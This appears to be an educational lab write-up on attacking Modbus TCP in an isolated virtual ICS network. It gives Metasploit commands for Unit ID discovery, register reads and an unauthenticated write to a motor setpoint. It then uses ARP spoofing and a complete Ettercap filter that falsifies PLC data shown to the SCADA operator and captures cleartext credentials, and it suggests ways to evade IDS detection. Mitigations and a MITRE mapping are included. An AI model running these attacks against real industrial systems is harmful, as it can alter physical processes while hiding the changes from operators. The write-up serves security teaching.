# Lab 02: Modbus Protocol Analysis and Exploitation in an OT/ICS Network

---

## 📋 Table of Contents
- [🎯 Problem Statement and Lab Context](#-problem-statement-and-lab-context)
- [🏗️ Part 01: Lab Architecture and PLC Memory Map](#️-part-01-lab-architecture-and-plc-memory-map)
- [🔍 Part 02: Reconnaissance and Asset Identification](#-part-02-reconnaissance-and-asset-identification)
  - [1. Unit ID Discovery with `modbus_findunitid`](#1-unit-id-discovery-with-modbus_findunitid)
  - [2. Service Confirmation with `modbusdetect`](#2-service-confirmation-with-modbusdetect)
- [📖 Part 03: Reading Process Data with `modbusclient`](#-part-03-reading-process-data-with-modbusclient)
- [⚠️ Part 04: Write Attack — Manipulating the PLC](#️-part-04-write-attack--manipulating-the-plc)
- [🕵️ Part 05: Man-in-the-Middle Attack on the ICS Network](#️-part-05-man-in-the-middle-attack-on-the-ics-network)
  - [1. ARP Spoofing](#1-arp-spoofing)
  - [2. Building and Compiling the Ettercap Filter](#2-building-and-compiling-the-ettercap-filter)
  - [3. Launching the Attack with the Filter Active](#3-launching-the-attack-with-the-filter-active)
  - [4. Result: A Falsified Operator View](#4-result-a-falsified-operator-view)
- [📊 Identification & Synthesis Results](#-identification--synthesis-results)
- [🛡️ Recommended Mitigation & Hardening](#️-recommended-mitigation--hardening)
- [🧭 MITRE ATT&CK for ICS Mapping](#-mitre-attck-for-ics-mapping)
- [🧰 Tools Used](#-tools-used)

---

## 🎯 Problem Statement and Lab Context

Industrial protocols such as **Modbus TCP** were designed decades ago for closed, trusted serial networks, at a time when cybersecurity was not part of the design brief. When these protocols are later carried over routed IP networks — as is increasingly the case in modern OT environments — every device placed on the same network segment inherits an implicit, **unauthenticated trust relationship** with the PLC: there is no login, no token, and no cryptographic identity check anywhere in the protocol.

This lab demonstrates, end to end, what an attacker can do with that implicit trust, without ever needing valid credentials:
1. **Passive/active reconnaissance** — enumerate the Modbus slave and its Unit ID using Metasploit's SCADA auxiliary scanners.
2. **Direct manipulation** — read and write arbitrary process values on the live PLC via `modbusclient`.
3. **Network-level interception** — perform an ARP-spoofing-based Man-in-the-Middle attack and use a custom Ettercap filter to falsify the data shown on the SCADA supervision console in real time, while the physical process keeps running unmodified.

Every step below reproduces one of these three phases, screenshot by screenshot, with the underlying Modbus mechanics explained alongside the Metasploit/Ettercap output.

---

## 🏗️ Part 01: Lab Architecture and PLC Memory Map

**Description:**
The lab reproduces a minimal ICS segment with three roles on a single virtual LAN (`192.168.90.0/24`): a Windows host running a **Modbus Slave** simulator that plays the role of the field PLC, a VM running **ScadaBR** as the supervision/HMI console, and a Parrot VM acting as the attacker.

```
┌──────────────────────────────────────────────────────────┐
│              Virtual LAN 192.168.90.0/24                 │
│                                                          │
│  Windows (host)      → 192.168.90.1                      │
│  └── Modbus Slave (simulated PLC) — port 502, Unit ID 133│
│                                                          │
│  ScadaBR VM          → 192.168.90.5                      │
│  └── SCADA supervision — web interface on port 8080      │
│                                                          │
│  Parrot VM           → 192.168.90.114                    │
│  └── Attacker machine (Metasploit / Ettercap)            │
└──────────────────────────────────────────────────────────┘
```

The simulated PLC (Unit ID **133**) exposes the four standard Modbus data tables. Coils and Discrete Inputs model the on/off field devices (fan, indicator lamps, vane actuators, a start/auto selector), while the Holding and Input registers model analog process values (a counter, a drive/VFD setpoint, level and temperature readings). This memory map is the ground truth used throughout the lab to verify that every value read or written through Metasploit matches the real state of the automaton.

| Type | Function Code | Variable | Address | Initial Value |
|------|----------------|----------|---------|-----------------|
| Coils | FC=01 | FAN | 0 | 1 |
| Coils | FC=01 | GREEN | 2 | 1 |
| Coils | FC=01 | RED | 3 | 0 |
| Coils | FC=01 | VANE_1 | 5 | 1 |
| Discrete Inputs | FC=02 | START | 0 | 1 |
| Discrete Inputs | FC=02 | AUTO | 1 | 1 |
| Input Registers | FC=04 | LEVEL | 0 | 50 |
| Input Registers | FC=04 | TEMP | 2 | 20 |
| Holding Registers | FC=03 | CT | 0 | 3 |
| Holding Registers | FC=03 | VFD | 2 | 512 |
| Holding Registers | FC=03 | VANE_2 | 4 | 50 |
| Holding Registers | FC=03 | Motor | 6 | 10 |

The Modbus Slave simulator's four monitoring windows (`plc_inputStat.mbs`, `plc_inputReg.mbs`, `plc_HoldingReg.mbs`, `plc_coils.mbs`) display this map live and are used throughout the lab as the reference to confirm that Metasploit reads/writes are actually reaching the target.

![PLC memory map (Modbus Slave)](Screenshots/01-modbus-slave-register-map.png)

The simulator is configured to listen for Modbus TCP/IP connections on port 502 — no credentials, certificate, or access list is involved at any point in this configuration, which is precisely the gap exploited for the rest of the lab.

![Modbus TCP/IP connection setup](Screenshots/02-connection-setup-modbus-tcp.png)

---

## 🔍 Part 02: Reconnaissance and Asset Identification

### 1. Unit ID Discovery with `modbus_findunitid`

**Description:**
`modbus_findunitid` is a Metasploit auxiliary scanner built for one narrow task: brute-forcing the **Unit Identifier** field of the Modbus Application Protocol (MBAP) header. A single Modbus TCP gateway can relay several logical slave units behind one IP address, so before any read/write attack can target the right device, its active Unit ID has to be found.

```bash
msf > use auxiliary/scanner/scada/modbus_findunitid
msf auxiliary(modbus_findunitid) > set RHOSTS 192.168.90.1
msf auxiliary(modbus_findunitid) > set UNIT_ID_FROM 130
msf auxiliary(modbus_findunitid) > set UNIT_ID_TO 135
msf auxiliary(modbus_findunitid) > run
```

The module sweeps every Unit ID in the configured range and reports which ones return a well-formed Modbus response — the target in this lab answers correctly at ID **133**:

```
[*] Running module against 192.168.90.1
[*] 192.168.90.1:502 - Received: incorrect/none data from stationID 130
[*] 192.168.90.1:502 - Received: incorrect/none data from stationID 131
[*] 192.168.90.1:502 - Received: incorrect/none data from stationID 132
[+] 192.168.90.1:502 - Received: correct MODBUS/TCP from stationID 133   ← PLC found!
[*] 192.168.90.1:502 - Received: incorrect/none data from stationID 134
[*] 192.168.90.1:502 - Received: incorrect/none data from stationID 135
[*] Auxiliary module execution completed
```

![modbus_findunitid — configuration and result](Screenshots/03-modbus-findunitid-run.png)
![Detailed scan result](Screenshots/04-modbus-findunitid-resultat-detail.png)

**Traffic analysis.** Filtering the capture on `tcp.port == 502` shows the scanning pattern clearly: a brand new TCP connection is opened for every Unit ID tested (SYN → SYN-ACK → ACK → Modbus query → FIN), which makes the scan trivial to spot on the wire despite how simple it is to run.

![Wireshark — reconnaissance traffic list](Screenshots/05-wireshark-findunitid-liste.png)

Looking at a single packet's detail explains the module's underlying logic: Transaction ID 8448, Unit Identifier 133, Function Code 4 (*Read Input Registers*), with an **Illegal data value (3)** exception. The module sends the same *Read Input Registers* probe to every Unit ID in the range and treats an ID as active as soon as it gets **any well-formed Modbus reply** — exception or not — while an inactive ID simply produces no response or garbage data.

![Modbus/TCP packet detail](Screenshots/06-wireshark-findunitid-detail.png)

---

### 2. Service Confirmation with `modbusdetect`

**Description:**
`modbusdetect` complements `modbus_findunitid`: instead of brute-forcing a range of Unit IDs, it sends a single probe to confirm that a Modbus TCP service is reachable on a known host/Unit ID — useful once a target has already been identified and only needs to be verified, or as a lightweight first pass over a wider IP range.

```bash
msf > use auxiliary/scanner/scada/modbusdetect
msf auxiliary(modbusdetect) > set RHOST 192.168.90.1
msf auxiliary(modbusdetect) > set UNIT_ID 133
msf auxiliary(modbusdetect) > run
```

```
[+] 192.168.90.1:502 - MODBUS - received correct MODBUS/TCP header (unit-ID: 133)
[*] 192.168.90.1:502 - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

![modbusdetect — configuration and run](Screenshots/07-modbusdetect-run.png)

The Wireshark capture confirms the same underlying mechanism as `modbus_findunitid` — a single *Read Input Registers* probe answered with an "Illegal data value" exception — but this time only **one** request is sent instead of one per candidate ID, which makes `modbusdetect` far more discreet: it is built to confirm a target rather than to discover one.

![modbusdetect — Wireshark packet detail](Screenshots/08-wireshark-modbusdetect-detail.png)

---

## 📖 Part 03: Reading Process Data with `modbusclient`

**Description:**
`modbusclient` is Metasploit's general-purpose Modbus interaction module. Where the previous two modules only fingerprint a target, `modbusclient` speaks the protocol directly: it can read or write coils, discrete inputs, holding registers, and input registers on demand, using the exact function codes a legitimate SCADA master would use.

```bash
msf > use auxiliary/scanner/scada/modbusclient
[*] Setting default action READ_HOLDING_REGISTERS - view all 9 actions with the show actions command
msf auxiliary(modbusclient) > show actions
```

Available actions: `READ_COILS`, `READ_DISCRETE_INPUTS`, `READ_HOLDING_REGISTERS`, `READ_INPUT_REGISTERS`, `WRITE_COIL`, `WRITE_COILS`, `WRITE_REGISTER`, `WRITE_REGISTERS`.

![modbusclient — show options](Screenshots/09-modbusclient-show-options.png)

Key options are `DATA`/`DATA_COILS`/`DATA_REGISTERS` (payload for write actions), `DATA_ADDRESS` (starting register/coil), `HEXDUMP` (prints the raw response for manual decoding), `NUMBER` (how many registers/coils to read), and `UNIT_NUMBER` (the target's Unit ID, 133 in this lab).

### Holding Registers

```bash
set RHOST 192.168.90.1
set HEXDUMP true
set UNIT_NUMBER 133
set NUMBER 10
set DATA_ADDRESS 0
run
```

![Holding registers — read configuration](Screenshots/10-modbusclient-config-holding.png)

The response — `[3, 0, 512, 0, 50, 0, 10, 0, 0, 0]` — decodes to CT=3, VFD=512, VANE_2=50, Motor=10, an exact match with the reference memory map.

![READ_HOLDING_REGISTERS — result](Screenshots/11-modbusclient-resultat-holding.png)

The corresponding Wireshark capture shows the query/response pair on the wire, and the packet detail confirms the decode byte for byte: Byte Count 20, Register 0=3, 2=512, 4=50, 6=10.

![Wireshark — packet list](Screenshots/12-wireshark-holding-liste.png)
![Wireshark — Read Holding Registers detail](Screenshots/13-wireshark-holding-detail.png)

### Coils

```bash
set ACTION READ_COILS
run
```

The bit-level response matches the coil map exactly: Bit0=1 (FAN), Bit2=1 (GREEN), Bit3=0 (RED), Bit5=1 (VANE_1).

![READ_COILS — result](Screenshots/14-modbusclient-resultat-coils.png)
![Wireshark — Read Coils detail](Screenshots/15-wireshark-coils-detail.png)

### Discrete Inputs

```bash
set ACTION READ_DISCRETE_INPUTS
run
```

Response `[1, 1, 0, 0, ...]` → START=1, AUTO=1, again consistent with the reference state.

![READ_DISCRETE_INPUTS — result](Screenshots/16-modbusclient-resultat-discrete.png)
![Wireshark — Read Discrete Inputs detail](Screenshots/17-wireshark-discrete-detail.png)

### Input Registers

```bash
set ACTION READ_INPUT_REGISTERS
run
```

Response `[50, 0, 20, 0, ...]` → LEVEL=50, TEMP=20.

![READ_INPUT_REGISTERS — result](Screenshots/18-modbusclient-resultat-input.png)
![Wireshark — Read Input Registers detail](Screenshots/19-wireshark-input-detail.png)

> **Read phase conclusion:** all four Modbus data tables (coils, discrete inputs, holding registers, input registers) are fully readable with zero authentication, and every value retrieved through Metasploit matches the PLC's real state exactly.

---

## ⚠️ Part 04: Write Attack — Manipulating the PLC

**Description:**
Having confirmed that reads land exactly where expected, the same module is now used to **write** to the PLC — the same code path a legitimate SCADA operator would use to send a setpoint, except here there is no operator, no session, and no authorization check standing in the way.

![Reference PLC state before the attack](Screenshots/20-etat-avant-attaque.png)

**Objective:** change the motor speed by writing directly to the `Motor` holding register (address 6).

```bash
set ACTION WRITE_REGISTER
set DATA_ADDRESS 6
set DATA 500
run
```

```
[*] Sending WRITE REGISTER...
[+] 192.168.90.1:502 - Value 500 successfully written at registry address 6
```

![WRITE_REGISTER — result](Screenshots/21-attaque-write-register-motor-500.png)

The Modbus Slave simulator confirms the change live: `Motor = 500`. The injection landed exactly as sent — a network attacker with no credentials at all can take full control of a physical actuator's setpoint.

![Confirmation on the real PLC](Screenshots/22-plc-confirmation-motor-500.png)

| Variable | Value before | Value after the attack |
|----------|--------------|--------------------------|
| Motor (Holding Reg, @6) | 10 | **500** |

---

## 🕵️ Part 05: Man-in-the-Middle Attack on the ICS Network

**Description:**
The final phase moves from *"an attacker can talk to the PLC"* to a more insidious scenario: *"an attacker sits between the PLC and the supervision console and rewrites what the operator sees."* The goal is to intercept the traffic between ScadaBR and the PLC and falsify the Modbus responses in transit, so the physical process keeps running unmodified while the HMI shows a fabricated, reassuring state — the essence of an integrity attack against ICS telemetry.

### Setting up ScadaBR

ScadaBR's login page is reachable at `http://192.168.90.5:8080/ScadaBR/login.htm`.

![ScadaBR login page](Screenshots/23-scadabr-login.png)

The Modbus IP data source is pointed at the PLC (`192.168.90.1:502`), and a read test against the holding registers (Slave ID 133) confirms connectivity: `0003, 0000, 0200, 0000, 0032, 0000, 000a...` decodes to CT=3, VFD=512, VANE_2=50, and **Motor=10** — this reading is used as the reference baseline for the MITM demonstration, independent of the write attack performed in Part 04.

![Modbus data source configuration and read test](Screenshots/24-scadabr-config-modbus.png)

### 1. ARP Spoofing

Two `arpspoof` processes, one per direction, poison both endpoints' ARP caches so that the Parrot VM (`192.168.90.114`) inserts itself between ScadaBR and the PLC.

```bash
# Terminal 1 — tells ScadaBR that the PLC is at the attacker's MAC address
sudo arpspoof -i eth0 -t 192.168.90.5 192.168.90.1
```

![arpspoof — ScadaBR → PLC direction](Screenshots/25-arpspoof-scadabr-vers-plc.png)

```bash
# Terminal 2 — tells the PLC that ScadaBR is at the attacker's MAC address
sudo arpspoof -i eth0 -t 192.168.90.1 192.168.90.5
```

![arpspoof — PLC → ScadaBR direction](Screenshots/26-arpspoof-plc-vers-scadabr.png)

With both directions poisoned, all traffic between ScadaBR and the PLC now flows through the attacker's machine. A quick Wireshark check confirms the interception is live: the Modbus *Read Holding Registers* exchange between ScadaBR (`192.168.90.5`) and the PLC (`192.168.90.1`) is now visible at the MITM position — TCP retransmissions and an *ICMP Redirect* are visible side effects of the ARP poisoning instability, but the query is decoded cleanly.

![Wireshark — intercepted Holding Registers traffic](Screenshots/27-wireshark-mitm-holding-intercepte.png)
![Wireshark — intercepted Coils traffic](Screenshots/28-wireshark-mitm-coils-intercepte.png)

Ettercap can also drive the ARP poisoning internally, as a drop-in alternative to running `arpspoof` in two terminals:

```bash
sudo ettercap -T -q -i eth0 -M arp:remote /192.168.90.5// /192.168.90.1//
```

```
ARP poisoning victims:
  GROUP 1 : 192.168.90.5
  GROUP 2 : 192.168.90.1
Starting Unified sniffing...
```

![Ettercap — MITM active, no filter](Screenshots/29-ettercap-sans-filtre.png)

At this stage the interception is already broad enough to expose more than Modbus: the ScadaBR web interface (port 8080) is visible from the same vantage point, alongside another Modbus *Read Input Registers* exchange.

![Wireshark — intercepted ScadaBR HTTP + Input Registers traffic](Screenshots/30-wireshark-mitm-http-input.png)

### 2. Building and Compiling the Ettercap Filter

**Description:**
Passive interception only proves visibility; the attack becomes an *integrity* attack once a custom Ettercap filter actively rewrites the Modbus payload in flight. The filter below targets Modbus responses (`tcp.src == 502`) and performs three substitutions: forcing the coils (`VANE_1`, `FAN`, `GREEN`) to read as OFF, forcing the `Motor` holding register to read as `0` instead of `10`, and blocking any future command that would turn `VANE_1` back ON.

```c
// /tmp/mitm_modbus.ecf
if (ip.proto == TCP && tcp.src == 502) {

    # Falsify the Coils (VANE_1, FAN, GREEN)
    if (search(DATA.data, "\x85\x01")) {
        msg("MITM: Falsification coils\n");
        replace("\x85\x01\x02\x25", "\x85\x01\x02\x00");
    }

    # Falsify the Holding Registers (Motor = 10 -> 0)
    if (search(DATA.data, "\x85\x03")) {
        msg("MITM: Falsification registers\n");
        replace("\x00\x0a", "\x00\x00");
    }

    # Block any VANE_1 ON command -> force OFF
    if (search(DATA.data, "\x85\x05\x00\x05\xff\x00")) {
        msg("MITM: Blocage START\n");
        replace("\xff\x00", "\x00\x00");
    }
}
```

![Ettercap filter in nano](Screenshots/31-nano-filtre-ecf.png)

The filter's source (`.ecf`) is compiled to Ettercap's binary format (`.ef`) with `etterfilter`:

```bash
etterfilter /tmp/mitm_modbus.ecf -o /tmp/mitm_modbus.ef
```

Compilation loads 14 protocol tables and 13 constants and produces a 16-instruction filter, ready to be loaded by Ettercap.

![etterfilter — compilation output](Screenshots/32-etterfilter-compilation.png)

### 3. Launching the Attack with the Filter Active

```bash
sudo ettercap -T -q -i eth0 -F /tmp/mitm_modbus.ef -M arp:remote //192.168.90.5// //192.168.90.1//
```

Two notable events appear live in the Ettercap output once the filter is active:

```
HTTP : 192.168.90.5:8080 -> USER: admin  PASS: admin
       INFO: http://192.168.90.5:8080/ScadaBR/login.htm
       CONTENT: username=admin&password=admin
MITM: Falsification registers
```

Beyond triggering the Modbus register falsification, the MITM position also sniffs the ScadaBR login credentials in cleartext (`admin`/`admin`) — an unplanned bonus finding that highlights the lack of HTTPS on the supervision interface.

![Ettercap with filter — live output](Screenshots/33-ettercap-avec-filtre.png)

### 4. Result: A Falsified Operator View

The real PLC keeps running exactly as before: `Motor = 10`.

![Real PLC state (Motor = 10)](Screenshots/34-plc-etat-reel-motor10.png)

Reading the holding registers from ScadaBR now returns register 6 (`Motor`) as **0x0000 = 0**, instead of the real value of 10 — the `\x00\x0a → \x00\x00` substitution is working exactly as intended.

![ScadaBR shows Motor = 0 (falsified)](Screenshots/35-scadabr-motor-falsifie.png)

Reading the coils from ScadaBR returns all 10 values as `false`, even though `FAN`, `GREEN`, and `VANE_1` are genuinely ON on the PLC — the coil substitution is working too.

![ScadaBR shows all coils as false (falsified)](Screenshots/36-scadabr-coils-falsifie.png)

| Variable | Real state (PLC) | Displayed state (ScadaBR, falsified) |
|----------|-------------------|----------------------------------------|
| Motor | **10** | **0** |
| FAN | **ON (1)** | **false** |
| GREEN | **ON (1)** | **false** |
| VANE_1 | **ON (1)** | **false** |

> ✅ **Attack successful.** The operator loses all reliable visibility into the real state of the process — the supervision console displays a state that is completely disconnected from reality, without raising a single alarm.

### Filter Improvement Ideas

- Generalize the pattern matching to every relevant coil/register address rather than a single fixed value, so the filter survives minor configuration changes.
- Intercept traffic in **both directions** (operator requests as well as PLC responses) to also neutralize commands sent manually from ScadaBR.
- Recompute the Modbus length/checksum after substitution so an altered packet is not rejected as malformed.
- Restrict the filter's activation to precise conditions (source/destination IP, time window) instead of the entire port-502 traffic, to reduce the chance of detection by an industrial IDS.

---

## 📊 Identification & Synthesis Results

| Asset / Parameter | Value / Detail | Security Assessment |
|---|---|---|
| **Target PLC** | `192.168.90.1`, Unit ID 133 | Identified via `modbus_findunitid` / `modbusdetect` |
| **Industrial Service** | Modbus TCP (port 502/TCP) | Open, unauthenticated, fully readable and writable |
| **SCADA Platform** | ScadaBR (Modbus IP master) | Polls the PLC at `192.168.90.1:502`, HTTP only |
| **Protocol Security** | Plaintext Modbus TCP | No encryption, susceptible to eavesdropping and tampering |
| **Authentication** | None | Any host on the network can issue read/write commands |
| **Integrity Checks** | Basic TCP checksum only | No cryptographic MAC or digital signature on the payload |
| **Supervision Credentials** | `admin` / `admin`, sent over HTTP | Sniffed in cleartext during the MITM attack |

---

## 🛡️ Recommended Mitigation & Hardening

1. **Network Segmentation (Purdue Model):** isolate PLCs and SCADA/HMI systems into dedicated OT VLANs, separated from the IT network by industrial firewalls.
2. **Encryption:** carry Modbus TCP over TLS (Modbus Security) or a dedicated VPN tunnel for supervision traffic.
3. **Authentication:** where feasible, migrate to an industrial protocol with native authentication (e.g., OPC-UA) instead of, or alongside, legacy Modbus.
4. **ScadaBR hardening:** enforce HTTPS, replace default credentials, restrict management access.
5. **Monitoring:** deploy an OT-aware IDS to flag abnormal Modbus polling patterns, unauthorized write commands, and ARP poisoning attempts.
6. **ARP security:** use static ARP entries or Dynamic ARP Inspection (DAI) on the switching infrastructure.

---

## 🧭 MITRE ATT&CK for ICS Mapping

| Tactic | Technique | Illustrated by |
|--------|-----------|------------------|
| Discovery | T0846 — Remote System Discovery | `modbus_findunitid`, `modbusdetect` |
| Collection | T0802 — Automated Collection | `modbusclient` (coil/register reads) |
| Impair Process Control | T0836 — Modify Parameter | `modbusclient` (Motor write = 500) |
| Impact | T0831 — Manipulation of Control | Ettercap filter (Motor/coils falsification) |
| Credential Access | T0812 — Default Credentials | ScadaBR `admin`/`admin` sniffed over HTTP |

---

## 🧰 Tools Used

| Tool | Role |
|------|------|
| **Metasploit** (`msfconsole`) | Modbus reconnaissance and exploitation |
| **Modbus Slave** | Simulated industrial PLC |
| **ScadaBR** | HMI/SCADA supervision system |
| **arpspoof / Ettercap** | ARP spoofing and MITM interception |
| **etterfilter** | Compiling traffic-falsification filters |
| **Wireshark** | Network traffic capture and analysis |

---

*This write-up was produced in a virtualized, isolated lab environment for strictly educational purposes.*